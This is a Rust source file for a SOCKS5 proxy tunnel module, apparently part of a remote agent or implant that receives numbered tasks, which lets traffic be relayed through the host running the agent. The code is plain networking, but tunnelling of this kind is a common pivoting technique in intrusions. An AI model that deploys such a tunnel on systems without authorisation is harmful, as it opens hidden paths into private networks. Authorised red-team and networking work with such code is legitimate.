/// SOCKS5 proxy tunnel through the agent.

use super::TaskResult;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};

static TUNNEL_RUNNING: AtomicBool = AtomicBool::new(false);

pub fn start(task_id: i64, args: &serde_json::Value) -> TaskResult {
    if TUNNEL_RUNNING.load(Ordering::SeqCst) {
        return TaskResult::error(task_id, "tunnel already running".to_string());
    }

    let port = args
        .get("port")
        .and_then(|v| v.as_u64())
        .unwrap_or(1080) as u16;

    let bind_addr = args
        .get("bind")
        .and_then(|v| v.as_str())
        .unwrap_or("127.0.0.1");

    let listen_addr = format!("{}:{}", bind_addr, port);

    let listener = match TcpListener::bind(&listen_addr) {
        Ok(l) => l,
        Err(e) => return TaskResult::error(task_id, format!("bind: {}", e)),
    };

    // Set non-blocking so we can check the stop flag
    listener.set_nonblocking(true).ok();
    TUNNEL_RUNNING.store(true, Ordering::SeqCst);

    std::thread::spawn(move || {
        while TUNNEL_RUNNING.load(Ordering::SeqCst) {
            match listener.accept() {
                Ok((client, _addr)) => {
                    client.set_nonblocking(false).ok();
                    std::thread::spawn(move || {
                        handle_socks5_client(client);
                    });
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(std::time::Duration::from_millis(100));
                }
                Err(_) => break,
            }
        }
    });

    TaskResult::success(task_id, format!("SOCKS5 tunnel started on {}", listen_addr))
}

pub fn stop(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    if !TUNNEL_RUNNING.load(Ordering::SeqCst) {
        return TaskResult::error(task_id, "tunnel not running".to_string());
    }
    TUNNEL_RUNNING.store(false, Ordering::SeqCst);
    TaskResult::success(task_id, "tunnel stopped".to_string())
}

fn handle_socks5_client(mut client: TcpStream) {
    // SOCKS5 handshake
    let mut buf = [0u8; 258];

    // Read greeting: VER, NMETHODS, METHODS
    if client.read_exact(&mut buf[..2]).is_err() {
        return;
    }
    if buf[0] != 0x05 {
        return; // Not SOCKS5
    }
    let nmethods = buf[1] as usize;
    if client.read_exact(&mut buf[..nmethods]).is_err() {
        return;
    }

    // Reply: no authentication required
    if client.write_all(&[0x05, 0x00]).is_err() {
        return;
    }

    // Read request: VER, CMD, RSV, ATYP, DST.ADDR, DST.PORT
    if client.read_exact(&mut buf[..4]).is_err() {
        return;
    }

    if buf[0] != 0x05 || buf[1] != 0x01 {
        // Only CONNECT command supported
        let _ = client.write_all(&[0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0]);
        return;
    }

    let atyp = buf[3];
    let target_addr = match atyp {
        0x01 => {
            // IPv4
            let mut addr = [0u8; 4];
            if client.read_exact(&mut addr).is_err() {
                return;
            }
            format!("{}.{}.{}.{}", addr[0], addr[1], addr[2], addr[3])
        }
        0x03 => {
            // Domain name
            let mut len = [0u8; 1];
            if client.read_exact(&mut len).is_err() {
                return;
            }
            let dlen = len[0] as usize;
            let mut domain = vec![0u8; dlen];
            if client.read_exact(&mut domain).is_err() {
                return;
            }
            String::from_utf8_lossy(&domain).to_string()
        }
        0x04 => {
            // IPv6
            let mut addr = [0u8; 16];
            if client.read_exact(&mut addr).is_err() {
                return;
            }
            // Format as IPv6
            let parts: Vec<String> = (0..8)
                .map(|i| format!("{:x}", u16::from_be_bytes([addr[i * 2], addr[i * 2 + 1]])))
                .collect();
            parts.join(":")
        }
        _ => return,
    };

    // Read port
    let mut port_buf = [0u8; 2];
    if client.read_exact(&mut port_buf).is_err() {
        return;
    }
    let port = u16::from_be_bytes(port_buf);

    // Connect to target
    let target = format!("{}:{}", target_addr, port);
    match TcpStream::connect_timeout(
        &target.parse().unwrap_or_else(|_| {
            // Try DNS resolution
            use std::net::ToSocketAddrs;
            target
                .to_socket_addrs()
                .ok()
                .and_then(|mut addrs| addrs.next())
                .unwrap_or_else(|| "0.0.0.0:0".parse().unwrap())
        }),
        std::time::Duration::from_secs(10),
    ) {
        Ok(remote) => {
            // Send success reply
            let _ = client.write_all(&[0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0]);

            // Bidirectional relay
            relay_streams(client, remote);
        }
        Err(_) => {
            // Connection refused
            let _ = client.write_all(&[0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0]);
        }
    }
}

fn relay_streams(mut client: TcpStream, mut remote: TcpStream) {
    let mut client_clone = match client.try_clone() {
        Ok(c) => c,
        Err(_) => return,
    };
    let mut remote_clone = match remote.try_clone() {
        Ok(r) => r,
        Err(_) => return,
    };

    // Client → Remote
    let t1 = std::thread::spawn(move || {
        let mut buf = [0u8; 8192];
        loop {
            match client.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if remote.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
            }
        }
        let _ = remote.shutdown(std::net::Shutdown::Both);
    });

    // Remote → Client
    let t2 = std::thread::spawn(move || {
        let mut buf = [0u8; 8192];
        loop {
            match remote_clone.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if client_clone.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
            }
        }
        let _ = client_clone.shutdown(std::net::Shutdown::Both);
    });

    let _ = t1.join();
    let _ = t2.join();
}
